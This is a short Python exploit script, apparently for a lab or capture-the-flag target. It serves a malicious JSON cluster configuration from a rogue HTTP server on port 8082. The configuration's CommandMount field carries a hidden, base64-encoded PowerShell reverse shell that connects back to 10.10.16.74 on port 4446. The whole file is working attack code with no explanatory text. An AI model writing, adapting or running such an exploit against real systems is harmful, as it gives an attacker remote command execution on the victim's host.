import base64
from http.server import BaseHTTPRequestHandler, HTTPServer

LHOST = "10.10.16.74"
LPORT = "4446"
ps_cmd = f"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"
ps_b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
cmd_mount = f"cmd.exe /c powershell -nop -w hidden -enc {ps_b64}"

body = ('{"ClusterID":"f0e12780-f462-4b51-a7db-149f1d56209c",'
        '"SharedSecret":"vulncheck",'
        '"TargetHubs":{"a":"b"},'
        '"IsStandby":false,'
        '"SystemMount":{"Enabled":true,"ReadOnly":false,"MountPath":"/a","CommandMount":"' + cmd_mount.replace('\\','\\\\') + '"},'
        '"SystemAdminUsernames":["poptart"]}')

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(f"[+] Hit: {self.path}")
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(body.encode())
    def do_GET(self):
        self.do_POST()
    def log_message(self, format, *args):
        print("[log]", format % args)

HTTPServer(('0.0.0.0', 8082), Handler).serve_forever()
